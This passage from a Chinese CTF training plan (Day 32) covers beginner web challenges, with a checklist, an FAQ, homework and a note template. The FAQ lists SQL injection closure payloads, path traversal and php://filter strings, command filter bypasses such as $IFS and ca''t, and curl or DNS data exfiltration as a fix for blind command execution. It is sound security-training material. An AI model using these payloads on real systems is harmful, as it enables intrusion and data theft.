  3. 关键字绕过方法
  4. 无回显处理方法

巩固方法：
  - 背诵连接符含义
  - 练习各种绕过
  - 总结常用命令
```

### 6.3 Web新手区通关总结

```
【通关检查清单】

✅ 信息搜集类
  - robots.txt题目
  - 目录扫描题目
  - Git泄露题目
  - 备份文件题目

✅ HTTP协议类
  - Cookie伪造题目
  - 请求头修改题目
  - 状态码题目

✅ SQL注入类
  - 数字型注入题目
  - 字符型注入题目
  - 报错注入题目
  - 布尔盲注题目
  - 时间盲注题目

✅ 文件包含类
  - LFI题目
  - 伪协议题目
  - 路径绕过题目

✅ 命令执行类
  - 基础命令注入题目
  - 空格绕过题目
  - 关键字绕过题目

✅ 综合类
  - 多步骤题目
  - 多漏洞组合题目

【通关标准】

独立完成率 ≥ 70%
  - 不看WriteUp完成大部分题目
  - 超时题目能在看WriteUp后重做成功

解题速度达标
  - 简单题 ≤ 10分钟
  - 中等题 ≤ 20分钟

知识点掌握
  - 能手写核心Payload
  - 能解释漏洞原理
  - 能应对常见过滤

【下一步目标】

如果已通关：
  - 挑战进阶区题目
  - 参加线上比赛
  - 学习更多漏洞类型

如果未通关：
  - 继续练习薄弱题型
  - 复习相关知识点
  - 多做几遍错题
```

---

## 七、常见问题FAQ

### Q1: SQL注入总是报错怎么办？

```
回答：
  可能的原因和解决方法：

原因1：闭合方式不对
  现象：输入单引号报错，但无法正常执行
  解决：
    - 尝试不同闭合方式
    - 单引号、双引号、括号
    - ?id=1'、?id=1"、?id=1')

原因2：列数判断错误
  现象：union select报错
  解决：
    - 重新用order by判断列数
    - 确保列数正确

原因3：有过滤
  现象：输入union报错
  解决：
    - 查看源码找过滤逻辑
    - 使用绕过方法

原因4：数据类型不匹配
  现象：union select报错
  解决：
    - 确保每个位置的类型匹配
    - 数字位置用数字，字符串位置用字符串

排查步骤：
  1. 先确认注入类型和闭合方式
  2. 确认列数
  3. 测试是否有过滤
  4. 逐步调试Payload
```

### Q2: 文件包含读取不到文件怎么办？

```
回答：
  可能的原因和解决方法：

原因1：路径不对
  现象：404 Not Found
  解决：
    - 尝试不同路径层级
    - ../../../flag、../../flag、../flag
    - 使用绝对路径 /flag

原因2：有后缀限制
  现象：文件名自动加.php
  解决：
    - 使用伪协议绕过
    - php://filter/convert.base64-encode/resource=flag

原因3：有路径过滤
  现象：输入../报错
  解决：
    - 使用双写绕过：....//
    - 使用编码绕过：..%2f

原因4：权限限制
  现象：403 Forbidden
  解决：
    - 尝试其他文件
    - 使用伪协议读取源码

排查步骤：
  1. 确认文件包含漏洞存在
  2. 尝试不同路径
  3. 使用伪协议
  4. 绕过各种过滤
```

### Q3: 命令执行没有输出怎么办？

```
回答：
  可能的原因和解决方法：

原因1：命令被过滤
  现象：输入cat报错
  解决：
    - 使用替代命令：head、more、less
    - 使用绕过方法：ca''t

原因2：无回显设计
  现象：命令执行了但没输出
  解决：
    - 写入文件再读取
    - 使用curl外带数据
    - 使用DNS外带数据

原因3：空格被过滤
  现象：命令无法执行
  解决：
    - 使用$IFS替代空格
    - 使用%09替代空格

原因4：flag位置不对
  现象：cat /flag找不到
  解决：
    - 先用find查找flag位置
    - find / -name "*flag*"

排查步骤：
  1. 确认命令注入存在
  2. 测试各种连接符
  3. 绕过各种过滤
  4. 处理无回显情况
```

### Q4: 综合题目没有思路怎么办？

```
回答：
  综合题目解题思路：

第一步：全面信息搜集
  1. 扫描目录
     python dirsearch.py -u http://target.com -e php,html,txt,zip
  2. 查看源码
     F12查看页面源码
  3. 查看robots.txt
  4. 查看响应头和Cookie

第二步：分析发现的信息
  1. 敏感目录：访问查看内容
  2. 源码泄露：下载分析代码
  3. 备份文件：解压查看内容
  4. 注释信息：寻找线索

第三步：找漏洞入口
  1. 分析输入点
     - URL参数
     - 输入框
     - Cookie
  2. 测试常见漏洞
     - SQL注入
     - 文件包含
     - 命令执行

第四步：逐步深入
  1. 利用发现的漏洞
  2. 获取更多信息
  3. 找到下一步线索
  4. 继续利用

第五步：获取flag
  1. 最终拿到flag
  2. 验证正确性
  3. 提交得分

如果还是没思路：
  - 看WriteUp学习思路
  - 记录学到的方法
  - 重新做一遍
```

### Q5: 如何提高解题速度？

```
回答：
  提高解题速度的方法：

方法1：熟练掌握基础知识
  - 背诵核心Payload
  - 理解漏洞原理
  - 知道常见绕过方法

方法2：建立解题流程
  - 固定的信息搜集步骤
  - 固定的漏洞测试步骤
  - 减少无效尝试

方法3：使用自动化工具
  - dirsearch自动扫描
  - Burp Intruder自动测试
  - Python脚本自动盲注

方法4：积累经验
  - 多做题，见多识广
  - 总结常见题型
  - 形成解题套路

方法5：合理分配时间
  - 简单题快速解决
  - 中等题专注攻克
  - 困难题适时放弃

时间分配建议：
  信息搜集：3分钟
  漏洞测试：5分钟
  Payload构造：5分钟
  获取数据：5分钟
  调试绕过：2分钟

总计：约20分钟
```

---

## 八、今日总结

### 8.1 知识点回顾

```
【今日核心知识点】

✅ SQL注入实战
  - 数字型注入完整流程
  - 字符型注入闭合方式
  - 报错注入使用方法
  - 布尔盲注逐字符获取
  - 时间盲注响应判断

✅ 文件包含实战
  - LFI基本利用
  - PHP伪协议详解
  - 路径绕过方法
  - 后缀绕过方法

✅ 命令执行实战
  - 命令连接符使用
  - 空格绕过方法
  - 关键字绕过方法
  - 无回显处理方法

✅ 综合题目思路
  - 信息搜集优先
  - 多漏洞组合
  - 逐步深入
  - 细节观察

✅ 错题复盘方法
  - 分析卡住原因
  - 学习正确解法
  - 重做验证
  - 总结归纳
```

### 8.2 今日作业

```
【必做作业】

1. 完成攻防世界Web新手区剩余题目
   要求：
   - SQL注入类：至少3道
   - 文件包含类：至少2道
   - 命令执行类：至少2道
   - 综合类：至少1道

2. 整理SQL注入完整流程
   要求：
   - 手写完整注入步骤
   - 记录每个步骤的Payload
   - 总结常见过滤和绕过

3. 整理错题本
   要求：
   - 记录所有卡住的题目
   - 分析卡住原因
   - 写下正确解法
   - 重做验证

【选做作业】

1. 挑战进阶区题目
   - 尝试中等难度题目
   - 学习新漏洞类型

2. 编写自动化脚本
   - SQL盲注自动化脚本
   - 目录扫描脚本

3. 制作知识卡片
   - SQL注入卡片
   - 文件包含卡片
   - 命令执行卡片
```

### 8.3 明日预告

```
【Day 33：攻防世界Misc新手区实战】

学习内容：
  - Misc新手区题目概览
  - LSB隐写与StegSolve
  - 音频隐写与Audacity
  - 文件头修复实战
  - 流量分析实战
  - 编码解码实战

准备工作：
  - 安装StegSolve工具
  - 安装Audacity工具
  - 复习文件头知识
  - 复习编码知识
```

---

## 九、笔记模板

```
Day 32 学习笔记
====================

日期：____年__月__日
学习时长：___小时

一、SQL注入实战
----------------
1. 数字型注入流程：
   
2. 字符型注入闭合：
   
3. 报错注入Payload：
   
4. 盲注方法：
   

二、文件包含实战
----------------
1. LFI利用方法：
   
2. PHP伪协议：
   
3. 路径绕过：
   

三、命令执行实战
----------------
1. 命令连接符：
   
2. 空格绕过：
   
3. 关键字绕过：
   
4. 无回显处理：
   

四、实战题目记录
----------------
题目1（SQL注入）：
  名称：
  类型：
  解题步骤：
  Payload：
  Flag：
  用时：

题目2（文件包含）：
  名称：
  类型：
  解题步骤：
  Payload：
  Flag：
  用时：

题目3（命令执行）：
  名称：
  类型：
  解题步骤：
  Payload：
  Flag：
  用时：

题目4（综合题）：
  名称：
  解题步骤：
  关键发现：
  Flag：
  用时：


五、错题复盘
------------
题目：
  卡在哪里：
  卡住原因：
  正确解法：
  学到的知识：
  是否重做：


六、知识巩固
------------
SQL注入：
  手写流程：
  
文件包含：
  伪协议列表：
  
命令执行：
  绕过方法：


七、自我评价
------------
理解程度：⭐⭐⭐⭐⭐
动手能力：⭐⭐⭐⭐⭐
完成情况：⭐⭐⭐⭐⭐

八、明日计划
------------
1. 
2. 
3. 
```

---

**恭喜你完成Day 32的学习！明天进入Misc方向！** 🎉